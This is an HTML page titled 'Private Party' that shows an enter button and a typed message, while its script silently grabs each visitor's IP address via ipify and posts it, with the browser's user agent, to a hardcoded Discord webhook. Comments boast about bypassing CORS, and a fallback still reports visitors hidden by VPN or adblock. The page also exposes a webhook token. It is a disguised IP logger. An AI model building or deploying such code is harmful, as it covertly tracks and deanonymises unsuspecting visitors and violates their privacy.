<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Private Party</title>
    <style>
        body { background: #000; color: #999; font-family: "Courier New", monospace; margin: 0; overflow: hidden; }
        #enterScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; z-index: 9999; }
        #enterBtn { margin-top: 20px; padding: 10px 25px; border: 1px solid #999; background: transparent; color: #999; font-family: "Courier New"; cursor: pointer; transition: 0.3s; }
        #enterBtn:hover { color: #fff; border-color: #fff; box-shadow: 0 0 10px #fff; }
        #main { display: none; height: 100vh; align-items: center; justify-content: center; }
        #text { font-size: 1.3rem; letter-spacing: 2px; white-space: pre-wrap; color: #fff; text-align: center; }
    </style>
</head>
<body>

<div id="enterScreen">
    <div>
        [ CLICK TO ENTER ]<br><br>
        i love ave so much shes my baby :).<br><br>
    </div>
    <button id="enterBtn">ENTER</button>
</div>

<div id="main">
    <div id="text"></div>
</div>

<script>
const webhook = "https://discord.com/api/webhooks/1479284599925510316/_ICehxGmoiUvxjBcOGo-kuYdKAnozybsjq5p6hzeCQ4xcBSYHDmpp-plb3adBsXdTkWv";

document.getElementById("enterBtn").onclick = async () => {
    // 1. UI Switch
    document.getElementById("enterScreen").style.display = "none";
    document.getElementById("main").style.display = "flex";
    
    // Start typing the message immediately
    const message = "we never condoned violence";
    const textElement = document.getElementById("text");
    let i = 0;
    const type = () => {
        if (i < message.length) {
            textElement.textContent += message[i++];
            setTimeout(type, 100);
        }
    };
    type();

    // 2. The Log (The part that actually works)
    try {
        // Fetch IP with a timeout so it doesn't hang
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);
        
        const ipRes = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
        const ipData = await ipRes.json();
        const userIP = ipData.ip;

        // Using FormData to bypass CORS restrictions
        // This is the most reliable way to hit a Discord Webhook from a browser
        const params = new FormData();
        params.append('content', `**[NEW ACCESS: privateparty.sh]**\n> **IP:** \`${userIP}\`\n> **Browser:** \`${navigator.userAgent.split(') ')[1]}\``);

        fetch(webhook, {
            method: 'POST',
            mode: 'no-cors', // Bypasses the "Options" preflight block
            body: params
        });

    } catch (e) {
        // Fallback: Send a notification that someone joined even if IP fetch failed
        const fallback = new FormData();
        fallback.append('content', "⚠️ **Connection detected (IP hidden by Adblock/VPN)**");
        fetch(webhook, { method: 'POST', mode: 'no-cors', body: fallback });
    }
};
</script>
</body>
</html>
